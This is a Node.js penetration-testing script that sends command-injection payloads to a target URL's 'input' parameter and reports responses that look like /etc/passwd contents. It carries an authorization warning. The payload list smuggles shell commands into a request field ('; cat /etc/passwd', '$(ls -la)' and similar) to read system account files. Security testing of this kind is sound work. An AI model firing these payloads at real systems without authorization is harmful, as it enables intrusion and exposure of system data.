#!/usr/bin/env node
/**
 * Tests for basic command injection by sending various payloads to:
 *   <target_url>?input=<payload>
 *
 * WARNING: Use only on systems you own or have explicit authorization to test.
 */

const DEFAULT_TIMEOUT_MS = 5000;

const payloads = [
    "cat /etc/passwd",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "' && cat /etc/passwd",
    "$(ls -la)"
];

function usage() {
    console.log(`Usage: node ${process.argv[1]} <target_url>`);
    console.log(`Example: node ${process.argv[1]} "http://localhost:3000/endpoint"`);
}

async function fetchWithTimeout(url, timeoutMs) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    try {
        const resp = await fetch(url, { signal: controller.signal });
        clearTimeout(id);
        return resp;
    } catch (err) {
        clearTimeout(id);
        throw err;
    }
}

async function testInjection(targetUrl) {
    let vulnerable = false;

    console.log(`Testing command injection at ${targetUrl}`);

    for (const payload of payloads) {
        try {
            const fullUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}input=${encodeURIComponent(payload)}`;
            console.log(` -> Trying payload: ${payload}`);

            const resp = await fetchWithTimeout(fullUrl, DEFAULT_TIMEOUT_MS);
            const text = await resp.text();

            const lower = text.toLowerCase();
            const containsRoot = lower.includes('root:');
            const containsEtc = lower.includes('/etc/passwd');
            if ((containsRoot || containsEtc) && text.length > 100) {
                console.log(`[POSSIBLE VULN] payload "${payload}" returned suspicious output (status ${resp.status})`);
                vulnerable = true;
            } else {
                console.log(`   Not obviously vulnerable (status ${resp.status}, length ${text.length})`);
            }

        } catch (err) {
            if (err.name === 'AbortError') {
                console.log(`   Payload "${payload}" timed out after ${DEFAULT_TIMEOUT_MS} ms`);
            } else {
                console.log(`   Payload "${payload}" error: ${err.message}`);
            }
        }
    }

    return vulnerable;
}

(async () => {
    if (process.argv.length !== 3) {
        usage();
        process.exit(2);
    }

    const target = process.argv[2];

    try {
        const isVulnerable = await testInjection(target);
        if (isVulnerable) {
            console.log("\n[VULNERABLE] Command injection possible!");
            process.exit(0);
        } else {
            console.log("\nNo obvious command injection vectors detected.");
            process.exit(0);
        }
    } catch (err) {
        console.error("Fatal error:", err);
        process.exit(1);
    }
})();
